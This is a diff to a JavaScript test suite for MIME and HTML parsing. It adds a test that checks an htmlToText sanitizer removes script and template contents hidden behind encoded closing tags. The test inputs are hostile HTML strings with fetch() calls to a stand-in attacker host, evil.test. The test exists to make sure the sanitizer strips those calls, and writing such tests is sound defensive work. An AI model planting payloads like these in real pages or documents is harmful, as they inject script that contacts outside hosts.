@@ -68,6 +68,24 @@ describe('bounded MIME parsing', () => {
     expect(malformed).not.toMatch(/hidden|still-hidden/i)
   })
 
+  it('does not let encoded tags mutate a literal active-element stack', () => {
+    const closedLiteralCases = [
+      '<template>&lt;/template&gt;fetch("https://evil.test/template")</template>safe',
+      '<script>&lt;/script&gt;fetch("https://evil.test/script")</script>safe',
+      '<template><template>&lt;/template&gt;fetch("https://evil.test/same")</template></template>safe',
+      '<script><template>&lt;/template&gt;fetch("https://evil.test/different")</template></script>safe',
+      '&lt;template&gt;fetch("https://evil.test/encoded")&lt;/template&gt;safe'
+    ]
+    for (const hostile of closedLiteralCases) {
+      const text = htmlToText(hostile)
+      expect(text).toContain('safe')
+      expect(text).not.toMatch(/fetch|evil\.test/i)
+    }
+
+    const malformed = htmlToText('<template>&lt;/template&gt;fetch("https://evil.test/unclosed")')
+    expect(malformed).not.toMatch(/fetch|evil\.test/i)
+  })
+
   it('rejects XML/ADF attachments after decode; the 2 MiB raw bound remains the raw-input ceiling', async () => {
     const oversized = 'x'.repeat((256 * 1024) + 1)
     const parsed = await parseMimeContent(raw([
